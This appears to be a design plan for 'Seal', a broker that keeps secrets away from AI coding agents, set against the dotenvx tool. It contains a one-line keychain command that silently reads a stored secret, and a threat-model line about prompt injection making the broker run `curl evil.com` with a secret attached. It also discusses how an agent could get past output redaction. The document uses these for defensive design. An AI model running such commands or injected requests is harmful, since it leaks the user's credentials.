# Plan C, revised — the broker with dotenvx's ergonomics

Supersedes the "Possibility C" sketch in [POSSIBILITIES.md](POSSIBILITIES.md).
Written after measuring dotenvx properly (facts verified 2026-08-30): it is the
closest competitor, it beats today's Seal on nearly every practical axis, and
its paid tier already sells what we assumed was unmonetizable. This plan keeps
the one thing dotenvx structurally cannot do, and takes everything else.

## The synthesis in one line

> **dotenvx's portability becomes an optional backend. The broker becomes the
> mandatory delivery path.**

dotenvx's power comes from having a portable encrypted artifact. Seal's edge
comes from not having one. Those look contradictory only because both tools
conflate two planes that should be separate:

- **Storage plane** — where values rest. Pluggable. Keychain by default (no
  artifact to hoard); an encrypted file only when you actually need git-native
  distribution, and then as an explicit, warned-about downgrade.
- **Delivery plane** — how a value reaches a process. *Not* pluggable. Always
  the broker, always by reference, never into the agent's own environment.

Every feature below sits in one plane or the other. The security claim lives
entirely in the delivery plane, so improving portability can no longer erode it.

## Steal / keep / drop

| Feature | Source | Verdict |
|---|---|---|
| `run -- cmd` as the universal verb | dotenvx | **Steal.** It is the right ergonomic primitive. |
| Committed file that makes a fresh clone work | dotenvx | **Steal the property, not the file** — commit a manifest of *references* (`.seal`), never ciphertext. |
| First-class environments (`-e production`) | dotenvx | **Steal.** Today's vault-by-convention is weaker. |
| Key rotation as a verb | dotenvx | **Steal.** We have nothing. |
| Pre-commit leak scanning | dotenvx `ext precommit` | **Steal.** The broker knows every live value; this is nearly free. |
| Output redaction | dotenvx `--redact` | **Steal and move it.** Theirs filters the terminal; ours filters the stream the agent captures. |
| Encrypted-file storage | dotenvx | **Take as an opt-in backend**, never the default. |
| Injecting into the agent's own process | dotenvx | **Drop.** This is the flaw. `printenv` defeats it. |
| Values only in the OS keychain | Seal | **Keep** — the default, and the reason there is no artifact to hoard. |
| Reference-only agent surface | Seal (plan C) | **Keep.** The entire differentiator. |
| Local approval + audit, no server | Seal (plan C) | **Keep and lead with it** — Armor charges for this and takes your key. |
| Cloud storage backends in v1 | old plan C | **Drop.** Premature; nothing in the wedge needs them. |
| Self-hosted relay | old plan C | **Defer** to the team plane. |

## Topology

The inversion that matters: the broker wraps the agent but injects *nothing*
into it. The agent calls back per execution, and the secret lands in a
grandchild.

```
  seal serve                        broker — user-session daemon, unix socket
    │                               sole holder of plaintext; peer-cred auth
    ├─ spawn ─► coding agent        env contains SEAL_SOCK and nothing else
    │             │
    │             │  seal run --with stripe/sk -- ./deploy
    │             ▼
    │           seal (thin client)  no key material; proxies over the socket
    │             │
    └─────────────┴─ broker resolves ref ─► spawns ./deploy with the value in
                     *its* env, streams stdout/stderr back through a redactor
```

Consequences worth stating plainly:

- The agent's environment never holds a secret, so `printenv` yields nothing.
  This is the specific dotenvx failure we are fixing.
- The client binary is not trusted; it carries a request, not a key.
- The broker authenticates callers by peer credentials and process ancestry,
  so "which agent asked" is answerable — that is what makes audit meaningful.

## Prerequisite: fix the macOS ACL first

**Nothing else in this plan is true until this is done.** Today items are
created with `security add-generic-password -A` — "allow any application
without warning" (see [DECISIONS.md](DECISIONS.md)). Any process running as the
user, the coding agent included, can read every Seal secret silently:

```sh
security find-generic-password -s seal -a "stripe:sk" -w   # no prompt, any process
```

Verified on this machine 2026-08-30: a value written with `seal set` was read
back by a bare `security` call from an unrelated process, no prompt, no denial.

With `-A` in place, "the agent never sees the value" is false by inspection.
The fix is the one the original decision traded away: ship **one signed binary**
that is both CLI and GUI (the feature-gating already supports a single
codebase), get a Developer ID and a stable designated requirement, and create
items with an ACL bound to that identity. The `-A` rationale — cross-binary
re-prompts between an ad-hoc-signed GUI and the CLI — disappears when there is
one signed binary. Cost: an Apple Developer account and a notarization step in
CI.

Linux is weaker and we should say so publicly rather than imply parity: the
Secret Service unlocks per session and any same-user process can talk to it.
On Linux the honest claim is "the value never enters the model's context,"
not "the agent could not obtain it by other means."

## The manifest — dotenvx's best idea, without the ciphertext

dotenvx's real ergonomic win is that a fresh `git clone` plus one key just
works. We can have that property with no hoardable artifact by committing
*names* instead of *values*:

```toml
# .seal — safe to commit. No secrets, no ciphertext, no key material.
[env.development]
STRIPE_SECRET_KEY = "stripe/sk_test"
DATABASE_URL      = "hardroad/db_url_dev"

[env.production]
STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
DATABASE_URL      = "hardroad/db_url"
```

```sh
seal run -e production -- ./app     # resolve every ref, inject, redact output
seal doctor                         # which refs am I missing on this machine?
```

This is strictly better than a committed encrypted `.env` on two counts: there
is no ciphertext to harvest now and decrypt later, and a leaked machine
compromises one machine rather than the repo's entire history. It is worse on
exactly one count — a new teammate must obtain the values out of band, which is
what `seal export` and the team plane are for.

`approve = true` is the policy hook: production refs require a human tap before
the broker resolves them, which is the free, local version of what Armor sells.

## Positioning against Armor

dotenvx Armor ($5 solo / $20 team / $90 business) sells approval-before-decrypt,
audit logs, and enclave decryption — and gets there by moving your private key
off your machine onto their infrastructure. That is the counter-pitch:

> **Approval and audit without giving anyone your key.**

Seal can ship approval gates and a local audit log for free, because the broker
is already the only process that touches plaintext. Armor cannot match that
without abandoning the reason it charges.

What is left to sell is therefore the *team* boundary, not the security
features: shared vault sync, org policy, SSO/RBAC, long-retention audit, CI
federation. Same revenue shape as Armor, one layer further out. This remains
the genuinely unsolved question — see the end of this doc.

## Sequencing

| Phase | Ships | Why here |
|---|---|---|
| **0** | Signed single binary; restrictive keychain ACL | The claim is false without it |
| **1** | `seal serve` broker, `run --with`, redactor, MCP surface with no read tool | The differentiator, end to end |
| **2** | `.seal` manifest, `-e` environments, `doctor`, precommit hook | Ergonomic parity with dotenvx |
| **3** | `rotate`, `export`/transfer, `import --dotenvx` | Migration path off the twin |
| **4** | Approval tiers, local audit log | Free answer to Armor |
| **5** | Team plane (sync, policy, retention) | The paid seam, still undesigned |

Phases 0–2 are the minimum that makes Seal defensible *and* usable. Phase 3
turns dotenvx's install base into an adoption channel rather than a wall.

## MCP surface

Exactly four tools. The absence of a fifth is the product.

| Tool | Returns |
|---|---|
| `list` | Names and refs. Never values. |
| `run` | `{exit_code, stdout, stderr}` — redacted before it is returned |
| `set` / `delete` | Acknowledgement |
| `request_approval` | Pending / granted / denied |

There is no `read`, no `get`, no `reveal`. A tool that returns a value is the
one thing that cannot be added later without giving up the claim.

## Redaction, honestly

The broker knows every value it just injected, so it can scan the child's
stdout/stderr for those values plus their common encodings (base64, URL, JSON
string escaping) before the bytes reach the agent. That is meaningfully
stronger than dotenvx's terminal-level filter.

It is still best-effort against a hostile child: an agent can have the child
transform the value arbitrarily before printing it. The structural claim is
narrow and should be stated narrowly — *the broker never returns a value to the
model, and filters known values out of what it does return* — not "exfiltration
is impossible." Prompt injection can still ask the broker to run
`curl evil.com` with the secret attached. That is what approval tiers and
per-vault scoping are for, and they are mitigations, not proofs.

## Open questions

- Does the `.seal` manifest actually close the gap for teams, or does the
  out-of-band value transfer kill adoption before the team plane exists?
- Is Phase 0 (Developer ID, notarization, restrictive ACL) worth it before
  anyone is asking for the product? It is a hard prerequisite for honesty but
  produces no visible feature.
- Does the free approval-and-audit tier cannibalize the only thing people have
  demonstrably paid for in this category?
- Is `import --dotenvx` a migration path or an admission that the twin is the
  default and we are the add-on?
